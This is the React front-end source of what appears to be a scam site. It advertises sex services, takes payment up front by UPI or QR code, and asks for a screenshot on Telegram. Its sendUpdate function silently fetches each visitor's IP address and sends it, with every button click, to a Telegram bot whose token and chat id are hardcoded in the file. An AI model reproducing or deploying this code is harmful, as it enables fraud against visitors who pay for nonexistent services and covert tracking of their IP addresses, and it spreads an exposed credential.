/* eslint-disable no-unused-vars */
import './App.css';
import React, { useState, useEffect } from 'react';
import WhatsappModal from './WhatsappModal';
import PaymentModal from './PaymentModal';
import ProfileCard from './ProfileCard';
import QRCard from './QRCard';
import profiles from './profiles';
import './sidebar.css'
import { useHistory, useLocation } from 'react-router-dom';

let ip = 'Not Found'

export async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}
export const modals = {
  whatsapp: "whatasapp",
  paynow: "paynow",
  qr: "qr",
  none: "none"
}

function App(props) {
  const history = useHistory();
  const [activeModal, setActiveModal] = useState(modals.none)
  const [app, setApp] = useState("phonepe")
  const [isQROpen, setIsQROpen] = useState(props.isQROpen ? props.isQROpen : false);
  const [isPaymentOpen, setIsPaymentOpen] = useState(props.isPaymentModalOpen ? props.isPaymentModalOpen : false);
  const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
  const profile = profiles[process.env.REACT_APP_USERNAME?.toLowerCase()] || profiles['shruthie'];

  useEffect(() => {
    switch (activeModal) {
      case modals.paynow:
        setIsPaymentOpen(true);
        setIsQROpen(false);
        setIsWhatsappOpen(false)
        break;
      case modals.qr:
        setIsPaymentOpen(false);
        setIsQROpen(true);
        setIsWhatsappOpen(false)
        break;
      case modals.whatsapp:
        setIsPaymentOpen(false);
        setIsQROpen(false);
        setIsWhatsappOpen(true)
        break;
      default:
        break;
    }
  }, [activeModal]);

  const handleModals = (activeModal, app) => {
    setActiveModal(activeModal);
    setApp(app)
  }

  const handlepayButton = async () => {
    console.log('pay button clicked')
    setIsPaymentOpen(!isPaymentOpen);
    await sendUpdate("PayButton")
  }

  const handleQRButton = async () => {
    console.log('QR button clicked')
    setIsQROpen(!isQROpen);
    await sendUpdate("QRButton")
  }

  const togglePay = () => {
    setIsPaymentOpen(!isPaymentOpen);
  }

  const handleWspButton = async () => {
    setIsWhatsappOpen(!isWhatsappOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <div>
        <h6 id='serviceName'>WebCam Services</h6>
        <ProfileCard />
        <div >
          <button className='button' style={{ background: "#00a3ff", padding: "0px 25px" }}
            onClick={
              async () => {
                await sendUpdate("LOGIN TAB");
                history.push('/free-demo');
              }
            }>
            {"Login for free Demo"}</button>
        </div>

        <div className="msgBtn">
          {/* <h6>{"Finish PAYMENT to Unlock the Number!!😜"}</h6> */}
          <div className='btnGrp'>
            <button className='button' onClick={() => { handlepayButton() }}>
              <img src="./upiwhite.png" style={{ width: '30px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
              {"PAY NOW!!"}</button>
            <button className='button' onClick={() => { handleQRButton() }}>
              <img src="./qr-code.png" style={{ width: '20px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
              {"QR Code"}</button>
          </div>
        </div>
        <h6>{"Geunine Sex Services!! Available All Indian Girls"}</h6>
        <div className="msgBtn">
          <div>
            <h6 style={{ display: "block" }}>{"Click Below👇 For My Whatsapp Number!!"}</h6>
          </div>
          <div className='btnGrp'>
            <button className='button' onClick={() => { handleWspButton() }}>
              <img src="./whatsapp.png" style={{ width: '28px', margin: '-4px 2px 0 -3px' }} alt="whatsapp logo"></img>
              {"Whatsapp"}
            </button>
            <button className="button" style={{ background: "#00a3ff" }}>
              <img src="./tg.svg" style={{ width: '24px', margin: '-4px 1px 0 -3px' }} alt="Telegram logo"></img>
              <a href={`https://t.me/${profile.telegram}`} style={{ color: "white" }}> Telegram </a>
            </button>
          </div>
        </div>

        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY and Send me SCREENSHOT on Telegram!!🥰</h6>
        <div>
          <button className='button' style={{
            background: "firebrick",
            padding: "0px 20px"
          }}
            onClick={
              async () => {
                await sendUpdate("Register TAB");
                history.push('/register');
              }
            } >
            Create your own website</button>
        </div>
        <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
        <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} handleModals={handleModals} className="special_modal2"></PaymentModal>
        <QRCard isOpen={isQROpen} setisOpen={setIsQROpen} app={app} className="special_modal2"></QRCard>
      </div>
    </div >
  );
}


export default App;
